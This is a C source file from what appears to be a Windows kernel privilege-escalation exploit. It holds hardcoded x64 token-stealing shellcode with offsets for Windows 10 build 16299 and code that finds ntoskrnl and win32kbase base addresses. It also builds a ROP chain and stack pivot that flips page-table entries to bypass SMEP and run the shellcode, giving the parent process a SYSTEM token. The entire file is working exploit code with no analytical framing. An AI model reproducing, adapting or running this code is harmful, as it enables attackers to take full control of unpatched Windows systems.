#include "shellcode.h"

typedef struct _shellcode_offsets
{
    DWORD KPRCB_CurrentThread;
    DWORD ApcState_Process;
    DWORD ActiveProcessLinks;
    DWORD Token;
    DWORD KernelApcDisable;
} shellcode_offsets;


PVOID generateShellcode(DWORD pid, BOOL debug)
{
    unsigned char sc_template[172] = {
        0x90, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00,
        0x00, 0x00, 0x49, 0x89, 0xC1, 0x48, 0x8B, 0x80, 0xE8, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48,
        0x8B, 0x50, 0xF8, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xFA, 0x04, 0x75, 0xF0, 0x4C,
        0x8B, 0x58, 0xF8, 0x49, 0x89, 0xC2, 0x48, 0x8B, 0x00, 0x49, 0x81, 0xFB, 0xB8, 0x0A, 0x00, 0x00,
        0x75, 0xED, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF8, 0x49, 0x81, 0xEA, 0xE8, 0x02, 0x00,
        0x00, 0x49, 0x8B, 0x8A, 0x58, 0x03, 0x00, 0x00, 0x48, 0x83, 0xE1, 0x07, 0x48, 0x01, 0xCA, 0x49,
        0x89, 0x92, 0x58, 0x03, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66,
        0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0x31, 0xC9, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B,
        0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58,
        0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F, 0x07
    };

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    DWORD dwMajor, dwMinor, dwBuildNumber;
    fnRtlGetNtVersionNumbers RtlGetNtVersionNumbers = (fnRtlGetNtVersionNumbers)GetProcAddress(hNtdll, "RtlGetNtVersionNumbers");
    RtlGetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuildNumber);
    dwBuildNumber &= 0xffff;
    printf("[*] OS:%d.%d.%d\n", dwMajor, dwMinor, dwBuildNumber);

    shellcode_offsets offs;
    switch (dwBuildNumber) {
    //case 19041:  //testing
    case 16299: // 1709
        offs.KPRCB_CurrentThread = 0x188;
        offs.ApcState_Process = 0xb8;
        offs.ActiveProcessLinks = 0x2e8;
        offs.Token = 0x358;
        offs.KernelApcDisable = 0x1e4;
        break;
    /*case 15063:
        offs.KPRCB_CurrentThread = 0x188;
        offs.ApcState_Process = 0xb8;
        offs.ActiveProcessLinks = 0x2e8;
        offs.Token = 0x358;
        offs.KernelApcDisable = 0x1e4;
        break;*/
    default:
        printf("[-] Unsupported offsets for build: %d\n", dwBuildNumber);
        return NULL;
        break;
    }

    *(DWORD*)(sc_template + 0x8) = offs.KPRCB_CurrentThread;
    *(DWORD*)(sc_template + 0xf) = offs.ApcState_Process;
    *(DWORD*)(sc_template + 0x19) = offs.ActiveProcessLinks;
    *(DWORD*)(sc_template + 0x3d) = pid;
    *(BYTE*)(sc_template + 0x46) = offs.Token - offs.ActiveProcessLinks;
    *(DWORD*)(sc_template + 0x4e) = offs.ActiveProcessLinks;
    *(DWORD*)(sc_template + 0x55) = offs.Token;
    *(DWORD*)(sc_template + 0x63) = offs.Token;
    *(DWORD*)(sc_template + 0x73) = offs.KernelApcDisable;
    *(DWORD*)(sc_template + 0x7d) = offs.KernelApcDisable;
    if (debug) *(BYTE*)(sc_template) = 0xcc;


    char* sc = VirtualAlloc(
        NULL,
        sizeof(sc_template),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(sc, sc_template, sizeof(sc_template));
    return sc;

}

int getParentProcessPid()
{
    int pid = 0;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    pid = GetCurrentProcessId();
    int parentPid = 0;

    if (Process32First(h, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                parentPid = pe.th32ParentProcessID;
            }
        } while (Process32Next(h, &pe));
    }

    CloseHandle(h);
    return parentPid;
}

PVOID generatePivotAddress(BOOL debug)
{

    PVOID pivotAddress = NULL;
    HANDLE hFile = NULL;
    LPVOID shellcode;
    char buf[1000] = { 0 };
    PQWORD stackBuffer;
    PVOID reserveSpace = 0;
    BOOL bResult = FALSE;


    int parentPid = getParentProcessPid();
    if (!parentPid) {
        printf("[-] Failed getting parent process pid\n");
        goto _cleanup;
    }
    // Create shellcode
    shellcode = generateShellcode(parentPid, debug);
    if (!shellcode) {
        printf("[-] Failed creating shellcode\n");
        goto _cleanup;
    }
    printf("[*] Shellcode at: 0x%llx\n", shellcode);


    // Get ntoskrnl and win32kbase.sys base
    LPVOID drivers[0x500] = { 0 }; // Should be more than enough
    DWORD cbNeeded;
    QWORD ntoskrnlBase = 0;
    QWORD win32kBase = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
            char szDriver[0x100] = { 0 }; // Again, more than enough
            GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
            if (strcmp("ntoskrnl.exe", szDriver) == 0) {
                ntoskrnlBase = (QWORD)drivers[i];
                printf("[+] Found ntoskrnl.exe at: 0x%p\n", ntoskrnlBase);
            }
            if (strcmp("win32kbase.sys", szDriver) == 0) {
                win32kBase = (QWORD)drivers[i];
                printf("[+] Found win32kBase.sys at: 0x%p\n", win32kBase);
            }
            if (win32kBase && ntoskrnlBase) break;
        }
    } else {
        printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
        goto _cleanup;
    }

    if (!ntoskrnlBase) {
        printf("[-] Failed to find the base of ntoskrnl.exe\n");
        goto _cleanup;
    }
    if (!win32kBase) {
        printf("[-] Failed to find the base of win32kBase.sys\n");
        goto _cleanup;
    }


    // Allocating the stack pivot buffer and preparing rop chain
    // This allocates memory some pages below the stack pivot's address, for the system's use in normal page faults
    reserveSpace = VirtualAlloc((LPVOID)(STACK_PIVOT_ADDR - 0x1000), 0xA000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!reserveSpace) {
        printf("[-] Failed allocating enough room for stack for pivot: %d\n", GetLastError());
        goto _cleanup;
    }

    // Write and read some bytes to different memory pages so they are actually commited and used by the system
    // Otherwise, page fault's trap frames that the kernel will try to put there will fault themselves and that will cause a DOUBLE FAULT bug check
    printf("[*] Reserved space at: 0x%llx\n", reserveSpace);
    *(ULONGLONG*)reserveSpace = 0xAABBCCDDAABBCCDD;
    printf("[*] Data at reserved space: 0x%llx\n", *(ULONGLONG*)reserveSpace);
    *(ULONGLONG*)(STACK_PIVOT_ADDR - 0x1000) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(STACK_PIVOT_ADDR - 0x2000) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(STACK_PIVOT_ADDR - 0x3000) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(STACK_PIVOT_ADDR - 0x4000) = 0xDEADBEEFDEADBEEF;
    printf("[*] Data at wanna be trap frame: 0x%llx\n", *(ULONGLONG*)(STACK_PIVOT_ADDR - 0x1000));

    // Build rop chain
    stackBuffer = STACK_PIVOT_ADDR;
    printf("[*] New stack at: 0x%llx\n", stackBuffer);
    int index = 0;
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MiGetPteAddressOffset);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R9);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(0x1122334455667788);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MiGetPteAddressOffset);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(0x20);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + SUB_RAX_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + DEREF_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(4);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + SUB_RAX_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R9_PTR);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + WBINVD_GADGET);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    // Here you can push anything your shellcode might need
    //*(QWORD*)(stackBuffer + index++) = (QWORD)(more_info);

    printf("[+] Initialized stack pivot shellcode..\n");
    pivotAddress = (PVOID)((QWORD)ntoskrnlBase + STACK_PIVOT_GADGET);

_cleanup:

    return pivotAddress;
}